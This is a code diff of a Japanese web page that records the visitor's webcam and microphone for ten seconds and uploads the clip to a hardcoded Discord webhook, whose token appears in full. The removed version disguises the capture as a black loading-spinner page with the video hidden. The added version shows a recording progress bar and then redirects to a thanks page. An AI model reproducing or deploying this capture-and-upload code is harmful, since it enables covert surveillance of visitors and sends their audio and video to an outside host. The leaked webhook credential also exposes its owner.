@@ -1,99 +1,101 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Auto Record</title>
-    <style>
-        body, html {
-            height: 100%;
-            margin: 0;
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        #spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 2s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        video {
-            display: none; /* 非表示にしたい場合 */
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>録画中...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #f0f0f0;
+    }
+    #progressText {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    #progressBar {
+      width: 80%;
+      height: 25px;
+      background: #ddd;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+    #progressFill {
+      height: 100%;
+      background: #4caf50;
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+  </style>
 </head>
 <body>
 
-<div id="spinner"></div>
-<video id="video" autoplay muted></video>
+<div id="progressText">録画中... 0%</div>
+<div id="progressBar">
+  <div id="progressFill"></div>
+</div>
 
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq";
-    const video = document.getElementById("video");
-    const spinner = document.getElementById("spinner");
+  const webhookUrl = "https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq"; // ← 自分のWebhookに変更
+  const durationMs = 10000; // 録画10秒
+  const updateInterval = 100; // 0.1秒ごとに更新
 
-    let recordedChunks = [];
+  const progressText = document.getElementById("progressText");
+  const progressFill = document.getElementById("progressFill");
 
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-        .then(stream => {
-            video.srcObject = stream;
+  if (typeof MediaRecorder === 'undefined') {
+    alert("このブラウザは録画に対応していません。");
+  } else {
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
 
-            const mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
 
-            mediaRecorder.ondataavailable = event => {
-                if (event.data.size > 0) recordedChunks.push(event.data);
-            };
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        const file = new File([blob], "recorded.webm");
 
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: "video/webm" });
-                const file = new File([blob], "recorded.webm", { type: "video/webm" });
+        const formData = new FormData();
+        formData.append("file", file);
+        formData.append("content", "🎥 録画完了しました");
 
-                const formData = new FormData();
-                formData.append("file", file);
-                formData.append("content", "📹 自動録画データ");
-
-                fetch(webhookURL, {
-                    method: "POST",
-                    body: formData
-                })
-                .then(res => {
-                    spinner.style.display = "none";
-                    if (res.ok) {
-                        alert("✅ 録画をDiscordに送信しました！");
-                    } else {
-                        alert("❌ Discord送信失敗: " + res.status);
-                    }
-                })
-                .catch(err => {
-                    spinner.style.display = "none";
-                    console.error("送信エラー:", err);
-                    alert("❌ エラーが発生しました");
-                });
-            };
-
-            // 録画開始
-            mediaRecorder.start();
-
-            // 任意の録画時間（ミリ秒）→ 例: 30000 = 30秒
-            const RECORD_DURATION = 10000;
-
-            setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-            }, RECORD_DURATION);
-        })
-        .catch(error => {
-            console.error("カメラ・マイクの取得に失敗:", error);
-            alert("❌ カメラまたはマイクの使用が許可されていません。");
+        fetch(webhookUrl, {
+          method: "POST",
+          body: formData
+        }).then(() => {
+          window.location.href = "thanks.html"; // ← 録画後に移動したいHTML
+        }).catch(err => {
+          alert("送信失敗: " + err);
         });
+      };
+
+      mediaRecorder.start();
+
+      // プログレスバー制御
+      let currentStep = 0;
+      const totalSteps = durationMs / updateInterval;
+
+      const interval = setInterval(() => {
+        currentStep++;
+        const percent = Math.min(Math.round((currentStep / totalSteps) * 100), 100);
+        progressText.textContent = `録画中... ${percent}%`;
+        progressFill.style.width = `${percent}%`;
+
+        if (currentStep >= totalSteps) {
+          clearInterval(interval);
+          mediaRecorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }
+      }, updateInterval);
+    }).catch(err => {
+      alert("カメラ・マイクのアクセスが拒否されました：" + err);
+    });
+  }
 </script>
 
 </body>
